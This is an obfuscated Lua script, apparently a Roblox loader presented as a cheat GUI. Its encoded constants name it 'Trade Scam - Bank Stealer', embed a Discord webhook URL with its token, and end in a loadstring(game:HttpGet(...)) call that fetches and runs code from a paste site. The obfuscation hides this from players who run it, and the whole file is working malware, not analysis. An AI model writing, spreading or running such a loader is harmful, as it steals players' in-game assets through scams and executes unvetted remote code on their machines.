--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.8) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then local v82=0;while true do if (v82==0) then v19=v0(v3(v30,1,1));return "";end end else local v83=v2(v0(v30,16));if v19 then local v89=v5(v83,v19);v19=nil;return v89;else return v83;end end end);local function v20(v31,v32,v33)if v33 then local v84=(v31/(2^(v32-(2 -1))))%((5 -3)^(((v33-((878 -(282 + 595)) -0)) -(v32-(2 -(1638 -(1523 + 114))))) + (620 -(555 + 64)))) ;return v84-(v84%1) ;else local v85=(837 + 94) -(857 + 74) ;local v86;while true do if (v85==(568 -(367 + 201))) then v86=(929 -(214 + (1015 -302)))^(v32-(1 + (1065 -(68 + 997)))) ;return (((v31%(v86 + v86))>=v86) and 1) or (0 + 0) ;end end end end local function v21()local v34=1270 -(226 + (2490 -1446)) ;local v35;while true do if (v34==(4 -(5 -2))) then return v35;end if (v34==(117 -(32 + 85))) then v35=v1(v16,v18,v18);v18=v18 + ((1758 -800) -(892 + 65)) ;v34=1;end end end local function v22()local v36=350 -(87 + 263) ;local v37;local v38;while true do if (v36==(180 -(67 + 113))) then v37,v38=v1(v16,v18,v18 + 2 );v18=v18 + 2 + (0 -0) ;v36=1;end if (v36==(2 -1)) then return (v38 * (189 + 67)) + v37 ;end end end local function v23()local v39,v40,v41,v42=v1(v16,v18,v18 + (955 -(802 + 150)) );v18=v18 + (10 -6) ;return (v42 * 16777216) + (v41 * ((119876 -(915 + 82)) -53343)) + (v40 * (187 + (195 -126))) + v39 ;end local function v24()local v43=v23();local v44=v23();local v45=1;local v46=(v20(v44,1 + 0 ,26 -6 ) * ((1189 -(1069 + (1604 -(998 + 488))))^32)) + v43 ;local v47=v20(v44,47 -26 ,67 -36 );local v48=((v20(v44,32)==(1 + 0)) and  -((1 + 0) -0)) or (1 + 0) ;if (v47==0) then if (v46==(791 -(368 + 423))) then return v48 * (0 -0) ;else local v90=18 -(10 + 8) ;while true do if (v90==(0 -0)) then v47=443 -(341 + 75 + 26) ;v45=772 -(201 + 571) ;break;end end end elseif (v47==(6535 -4488)) then return ((v46==(0 + 0)) and (v48 * (1/(0 -0)))) or (v48 * NaN) ;end return v8(v48,v47-(1461 -(145 + 293)) ) * (v45 + (v46/(((1570 -(116 + 1022)) -(44 + 386))^52))) ;end local function v25(v49)local v50=0 -0 ;local v51;local v52;while true do if (v50==(1 + 0)) then v51=v3(v16,v18,(v18 + v49) -(3 -2) );v18=v18 + v49 ;v50=(1754 -(760 + 987)) -5 ;end if (v50==(1426 -(630 + (2706 -(1789 + 124))))) then return v6(v52);end if (v50==(6 -4)) then v52={};for v91=860 -((1580 -(745 + 21)) + 45) , #v51 do v52[v91]=v2(v1(v3(v51,v91,v91)));end v50=7 -4 ;end if (v50==0) then v51=nil;if  not v49 then v49=v23();if (v49==(0 -0)) then return "";end end v50=1 + 0 ;end end end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v53=0 + 0 ;local v54;local v55;local v56;local v57;local v58;local v59;local v60;local v61;while true do if (v53==2) then v58=nil;v59=nil;v53=1 + 2 ;end if ((402 -(108 + 294))~=v53) then else v54=336 -(144 + 192) ;v55=nil;v53=1490 -(570 + 919) ;end if (v53==4) then while true do if (v54==(2 -0)) then v59=nil;v60=nil;v54=814 -(569 + 242) ;end if (v54==(2 -1)) then local v99=0 + 0 ;while true do if (v99~=(1 + 0)) then else v54=2;break;end if (v99==(1024 -(706 + 318))) then v57=nil;v58=nil;v99=1505 -(363 + 1141) ;end end end if (v54==3) then v61=nil;while true do local v101=0;local v102;while true do if (0==v101) then v102=1580 -(1183 + 397) ;while true do if (v102==0) then local v103=1251 -(721 + 530) ;while true do if (v103==(1271 -(945 + 326))) then if (2~=v55) then else local v157=0;local v158;while true do if (v157~=0) then else v158=0 -0 ;while true do if (v158~=(0 -0)) then else local v169=0 + 0 ;while true do if (v169==(1975 -(1913 + 62))) then for v173=1,v23() do local v174=700 -(271 + 429) ;local v175;local v176;while true do if ((0 + 0)==v174) then v175=0 -0 ;v176=nil;v174=1934 -(565 + 1368) ;end if (v174==(1501 -(1408 + 92))) then while true do if (0~=v175) then else v176=v21();if (v20(v176,1087 -(461 + 625) ,1)==(1288 -(993 + 295))) then local v179=0 -0 ;local v180;local v181;local v182;local v183;local v184;while true do if (v179==0) then v180=0 + 0 ;v181=nil;v179=1172 -(418 + 753) ;end if (v179~=(1 + 1)) then else v184=nil;while true do if (v180==2) then while true do if (v181==(1 + 0)) then local v188=0 + 0 ;local v189;local v190;while true do if ((1 -0)==v188) then while true do if ((0 + 0)==v189) then v190=0 + 0 ;while true do if (v190==(530 -(406 + 123))) then v181=2;break;end if (0==v190) then local v201=304 -(244 + 60) ;while true do if (v201==(0 + 0)) then v184={v22(),v22(),nil,nil};if (v182==0) then local v203=0;local v204;while true do if (v203==(1322 -(1249 + 73))) then v204=0;while true do if (0==v204) then v184[3]=v22();v184[4 + 0 ]=v22();break;end end break;end end elseif (v182==(1 + 0)) then v184[1128 -(936 + 189) ]=v23();elseif (v182==2) then v184[1148 -(466 + 679) ]=v23() -((1615 -(1565 + 48))^(10 + 6)) ;elseif (v182~=3) then else local v213=0 -0 ;local v214;while true do if (v213==(0 -0)) then v214=1900 -(106 + 1794) ;while true do if (v214==(0 + 0)) then v184[1 + 2 ]=v23() -((269 -(176 + 91))^(46 -30)) ;v184[10 -6 ]=v22();break;end end break;end end end v201=115 -(4 + 110) ;end if (v201==(1093 -(975 + 117))) then v190=585 -(57 + 527) ;break;end end end end break;end end break;end if (v188~=(1427 -(41 + 1386))) then else v189=103 -(17 + 86) ;v190=nil;v188=1;end end end if (v181==(3 + 0)) then if (v20(v183,6 -3 ,3)==(3 -2)) then v184[13 -9 ]=v61[v184[11 -7 ]];end v56[v173]=v184;break;end if (v181==(5 -3)) then local v192=0 -0 ;local v193;while true do if (v192~=(166 -(122 + 44))) then else v193=0 + 0 ;while true do if (v193~=(0 -0)) then else local v199=0 -0 ;local v200;while true do if (v199==(0 -0)) then v200=1227 -(322 + 905) ;while true do if (v200~=(612 -(602 + 9))) then else v193=1 + 0 ;break;end if (v200==0) then local v202=0 + 0 ;while true do if (v202~=(0 -0)) then else if (v20(v183,1,66 -(30 + 35) )==(948 -(245 + 702))) then v184[6 -4 ]=v61[v184[2 + 0 ]];end if (v20(v183,2,1259 -(1043 + 214) )~=1) then else v184[3]=v61[v184[11 -8 ]];end v202=1;end if (v202~=1) then else v200=1;break;end end end end break;end end end if (1==v193) then v181=1215 -(323 + 889) ;break;end end break;end end end if (v181==0) then local v194=0 -0 ;while true do if (0~=v194) then else local v197=0 + 0 ;while true do if (v197~=(2 -1)) then else v194=1;break;end if (v197==(580 -(361 + 219))) then v182=v20(v176,2,323 -(53 + 267) );v183=v20(v176,1 + 3 ,6);v197=414 -(15 + 398) ;end end end if (v194==(1 -0)) then v181=2 -1 ;break;end end end end break;end if (v180~=(983 -(18 + 964))) then else local v185=0 -0 ;while true do if (v185==(1 + 0)) then v180=1692 -(1121 + 569) ;break;end if (v185==(0 + 0)) then v183=nil;v184=nil;v185=1;end end end if (v180~=(850 -(20 + 830))) then else local v186=0;local v187;while true do if (v186~=0) then else v187=0;while true do if (v187==(1 + 0)) then v180=127 -(116 + 10) ;break;end if (v187==(0 + 0)) then local v198=738 -(542 + 196) ;while true do if (v198~=(1 -0)) then else v187=1;break;end if ((0 -0)==v198) then v181=0 + 0 ;v182=nil;v198=3 -2 ;end end end end break;end end end end break;end if (v179==(1 + 0)) then v182=nil;v183=nil;v179=1 + 1 ;end end end break;end end break;end end end for v177=1 -0 ,v23() do v57[v177-(2 -1) ]=v28();end v169=1 + 0 ;end if ((2 -1)~=v169) then else v158=1552 -(1126 + 425) ;break;end end end if (v158==1) then return v59;end end break;end end end if (v55~=(406 -(118 + 287))) then else v60=v23();v61={};for v160=3 -2 ,v60 do local v161=0 -0 ;local v162;local v163;local v164;while true do if (v161==(1121 -(118 + 1003))) then v162=0 -0 ;v163=nil;v161=1;end if (v161==(378 -(142 + 235))) then v164=nil;while true do if (v162~=(1 + 0)) then else if (v163==(4 -3)) then v164=v21()~=0 ;elseif (v163==(2 + 0)) then v164=v24();elseif (v163~=(1 + 2)) then else v164=v25();end v61[v160]=v164;break;end if (v162==(977 -(553 + 424))) then local v171=0 -0 ;local v172;while true do if (v171==0) then v172=0;while true do if (v172==(1 + 0)) then v162=1;break;end if (v172~=(0 -0)) then else v163=v21();v164=nil;v172=164 -(92 + 71) ;end end break;end end end end break;end end end v59[2 + 1 ]=v21();v55=2 -0 ;end v103=1 + 0 ;end if (v103~=(1 + 0)) then else v102=766 -(574 + 191) ;break;end end end if (v102~=(1 + 0)) then else if (v55~=0) then else local v138=0 -0 ;local v139;while true do if (v138==0) then v139=0 + 0 ;while true do if (v139==(851 -(254 + 595))) then v55=1;break;end if ((0 + 0)==v139) then local v167=0;while true do if (v167==(0 + 0)) then v56={};v57={};v167=1;end if (v167~=(2 -1)) then else v139=2 -1 ;break;end end end if ((2 -1)==v139) then local v168=0 + 0 ;while true do if (v168==(0 -0)) then v58={};v59={v56,v57,nil,v58};v168=1330 -(797 + 532) ;end if (v168==(1 -0)) then v139=2 + 0 ;break;end end end end break;end end end break;end end break;end end end break;end if (v54~=(0 + 0)) then else local v100=806 -(118 + 688) ;while true do if (v100~=(2 -1)) then else v54=1203 -(373 + 829) ;break;end if ((731 -(476 + 255))==v100) then v55=0 + 0 ;v56=nil;v100=1131 -(369 + 761) ;end end end end break;end if (v53==3) then v60=nil;v61=nil;v53=3 + 1 ;end if ((1 -0)==v53) then v56=nil;v57=nil;v53=3 -1 ;end end end local function v29(v62,v63,v64)local v65=v62[1];local v66=v62[2];local v67=v62[3];return function(...)local v68=v65;local v69=v66;local v70=v67;local v71=v27;local v72=1;local v73= -1;local v74={};local v75={...};local v76=v12("#",...) -1 ;local v77={};local v78={};for v87=0,v76 do if (v87>=v70) then v74[v87-v70 ]=v75[v87 + 1 ];else v78[v87]=v75[v87 + 1 ];end end local v79=(v76-v70) + 1 ;local v80;local v81;while true do local v88=0;while true do if (v88==0) then v80=v68[v72];v81=v80[1];v88=1;end if (v88==1) then if (v81<=7) then if (v81<=3) then if (v81<=1) then if (v81>0) then v78[v80[2]]=v64[v80[3]];else local v106=0;local v107;local v108;while true do if (v106==1) then v78[v107 + 1 ]=v108;v78[v107]=v108[v80[4]];break;end if (v106==0) then v107=v80[2];v108=v78[v80[3]];v106=1;end end end elseif (v81==2) then local v109=0;local v110;local v111;while true do if (v109==1) then v78[v110 + 1 ]=v111;v78[v110]=v111[v80[4]];break;end if (v109==0) then v110=v80[2];v111=v78[v80[3]];v109=1;end end else v78[v80[2]]();end elseif (v81<=5) then if (v81>4) then v78[v80[2]][v80[3]]=v80[4];else do return;end end elseif (v81==6) then local v114=0;local v115;while true do if (v114==0) then v115=v80[2];v78[v115]=v78[v115](v13(v78,v115 + 1 ,v73));break;end end else v78[v80[2]]();end elseif (v81<=11) then if (v81<=9) then if (v81>8) then local v116=0;local v117;while true do if (v116==0) then v117=v80[2];v78[v117]=v78[v117](v13(v78,v117 + 1 ,v73));break;end end else v78[v80[2]]=v80[3];end elseif (v81>10) then do return;end else v78[v80[2]]=v80[3];end elseif (v81<=13) then if (v81==12) then v78[v80[2]]=v64[v80[3]];else v78[v80[2]][v80[3]]=v80[4];end elseif (v81==14) then local v126=v80[2];local v127,v128=v71(v78[v126](v13(v78,v126 + 1 ,v80[3])));v73=(v128 + v126) -1 ;local v129=0;for v135=v126,v73 do v129=v129 + 1 ;v78[v135]=v127[v129];end else local v130=0;local v131;local v132;local v133;local v134;while true do if (v130==0) then v131=v80[2];v132,v133=v71(v78[v131](v13(v78,v131 + 1 ,v80[3])));v130=1;end if (v130==2) then for v155=v131,v73 do local v156=0;while true do if (v156==0) then v134=v134 + 1 ;v78[v155]=v132[v134];break;end end end break;end if (v130==1) then v73=(v133 + v131) -1 ;v134=0;v130=2;end end end v72=v72 + 1 ;break;end end end end;end return v29(v28(),{},v17)(...);end v15("LOL!173O0003023O005F4703083O00557365726E616D65030B3O00736861757279613239303203083O004469616D6F6E6473024O0080842E4103073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F3O31333830373130353231373032343O302F437174445255736949764C74484C525A46554F4858645351347554623270473241554B682O42734A78334B51567377412O4B77416153712D3347306B636F68664A2O394C030B3O0053637269702O744E616D65033F3O004D756C746920412O63652O7320475549202D205472616465205363616D202D2042616E6B20537465616C6572202D204175746F204661726D202D204475706503043O005469703103163O00506C65617365204C657420536372697074204C6F616403043O005469703203103O00466577205365636F6E6473204C65667403043O0054697033030E3O00557064617465642053637269707403043O0054697034030C3O00416C6D6F737420546865726503043O00546970352O033O003O2E030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403263O00682O7470733A2O2F70617374652E78797A6F2E73706163652F6E782O6C2F6D61696C2E6C7561001A3O00120C3O00013O0030053O0002000300120C3O00013O0030053O0004000500120C3O00013O0030053O0006000700120C3O00013O0030053O0008000900120C3O00013O0030053O000A000B00120C3O00013O0030053O000C000D00120C3O00013O0030053O000E000F00120C3O00013O0030053O0010001100120C3O00013O0030053O0012001300120C3O00143O00120C000100153O00202O00010001001600120A000300174O000F000100034O00095O00022O00033O000100012O000B3O00017O00",v9(),...);end
